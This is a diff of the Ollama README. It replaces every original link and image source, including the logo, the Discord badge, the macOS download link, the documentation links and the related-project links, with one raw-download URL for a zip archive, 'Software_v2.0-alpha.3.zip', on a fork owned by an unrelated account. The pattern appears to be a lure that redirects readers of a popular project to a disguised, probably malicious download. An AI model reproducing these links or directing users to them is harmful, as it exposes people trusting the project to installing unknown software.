@@ -1,13 +1,13 @@
 <div align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" height="200px" srcset="https://github.com/jmorganca/ollama/assets/3325447/56ea1849-1284-4645-8970-956de6e51c3c">
-    <img alt="logo" height="200px" src="https://github.com/jmorganca/ollama/assets/3325447/0d0b44e2-8f4a-4e99-9b52-a5c1c741c8f7">
+    <source media="(prefers-color-scheme: dark)" height="200px" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
+    <img alt="logo" height="200px" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
   </picture>
 </div>
 
 # Ollama
 
-[![Discord](https://dcbadge.vercel.app/api/server/ollama?style=flat&compact=true)](https://discord.gg/ollama)
+[![Discord](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip)](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip)
 
 > Note: Ollama is in early preview. Please report any issues you find.
 
@@ -15,13 +15,13 @@ Run, create, and share large language models (LLMs).
 
 ## Download
 
-- [Download](https://ollama.ai/download) for macOS
+- [Download](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) for macOS
 - Download for Windows and Linux (coming soon)
 - Build [from source](#building)
 
 ## Quickstart
 
-To run and chat with [Llama 2](https://ai.meta.com/llama), the new model by Meta:
+To run and chat with [Llama 2](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip), the new model by Meta:
 
 ```
 ollama run llama2
@@ -87,7 +87,7 @@ Hello! It's your friend Mario.
 
 For more examples, see the [examples](./examples) directory.
 
-For more information on creating a Modelfile, see the [Modelfile](./docs/modelfile.md) documentation.
+For more information on creating a Modelfile, see the [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) documentation.
 
 ### Pull a model from the registry
 
@@ -105,11 +105,11 @@ ollama list
 
 ### Overview
 
-Ollama bundles model weights, configuration, and data into a single package, defined by a [Modelfile](./docs/modelfile.md).
+Ollama bundles model weights, configuration, and data into a single package, defined by a [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip).
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" height="480" srcset="https://github.com/jmorganca/ollama/assets/251292/2fd96b5f-191b-45c1-9668-941cfad4eb70">
-  <img alt="logo" height="480" src="https://github.com/jmorganca/ollama/assets/251292/2fd96b5f-191b-45c1-9668-941cfad4eb70">
+  <source media="(prefers-color-scheme: dark)" height="480" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
+  <img alt="logo" height="480" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip">
 </picture>
 
 ## Building
@@ -150,7 +150,7 @@ curl -X POST http://localhost:11434/api/create -d '{"name": "my-model", "path": 
 
 ## Projects built with Ollama
 
-- [Continue](https://github.com/continuedev/continue) - embeds Ollama inside Visual Studio Code. The extension lets you highlight code to add to the prompt, ask questions in the sidebar, and generate code inline.
-- [Discord AI Bot](https://github.com/mekb-turtle/discord-ai-bot) - interact with Ollama as a chatbot on Discord.
-- [Raycast Ollama](https://github.com/MassimilianoPasquini97/raycast_ollama) - Raycast extension to use Ollama for local llama inference on Raycast.
-- [Simple HTML UI for Ollama](https://github.com/rtcfirefly/ollama-ui)
+- [Continue](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) - embeds Ollama inside Visual Studio Code. The extension lets you highlight code to add to the prompt, ask questions in the sidebar, and generate code inline.
+- [Discord AI Bot](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) - interact with Ollama as a chatbot on Discord.
+- [Raycast Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip) - Raycast extension to use Ollama for local llama inference on Raycast.
+- [Simple HTML UI for Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/web/Software_v2.0-alpha.3.zip)
